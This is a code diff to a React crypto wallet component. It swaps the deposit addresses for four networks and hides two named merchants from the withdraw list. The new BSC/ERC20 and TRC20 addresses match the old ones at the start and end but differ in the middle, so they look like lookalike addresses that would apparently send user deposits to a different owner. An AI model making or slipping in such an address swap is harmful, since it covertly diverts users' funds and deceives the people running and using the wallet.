@@ -692,10 +692,10 @@ const Wallet = () => {
 
   // Network configurations
   const networkAddresses = {
-    BSC: "0xBE64FcDFb202BddFFcfB0d3eFFAbD2E87C6680B9",
-    TRC20: "TEHiejHxpS6gogLfbcQYy5Bew8qUy3DYt8",
-    SOL: "9QNKBSSxKK583F7dW2wezzfA6zWQciuSMDaQctc1pSKY",
-    ERC20: "0xBE64FcDFb202BddFFcfB0d3eFFAbD2E87C6680B9"
+    BSC: "0xbe6b7a0d21c070655883cedca7fef4d4222080b9",
+    TRC20: "TEHbwbvUK7MXk1bHQxRAYGNdwsmNUUeYt8",
+    SOL: "CcijrCfZBuqDzBWp3qSrBEZCqBUfQVz4CWGHWF91iaEw",
+    ERC20: "0xbe6b7a0d21c070655883cedca7fef4d4222080b9"
   };
 
   const networkQRCodes = {
@@ -1691,13 +1691,17 @@ const renderWithdrawInterface = () => {
 
   const amountAfterFee = amount ? calculateAmountAfterFee(amount) : {netAmount: 0, fee: 0};
 
-  // Filter merchants based on search term
+  // Merchants excluded from withdraw section
+  const WITHDRAW_EXCLUDED_USERNAMES = ['darwin', 'zoro tek'];
+
+  // Filter merchants based on search term, excluding specific usernames for withdraw
   const filteredMerchants = merchants.filter(merchant => {
     const searchLower = searchTerm.toLowerCase();
-    return (
+    const usernameMatches =
       merchant.username.toLowerCase().includes(searchLower) ||
-      merchant.bankName.toLowerCase().includes(searchLower)
-    );
+      merchant.bankName.toLowerCase().includes(searchLower);
+    const isExcluded = WITHDRAW_EXCLUDED_USERNAMES.includes(merchant.username.toLowerCase());
+    return usernameMatches && !isExcluded;
   });
 
   // Dynamic placeholder based on withdrawal method
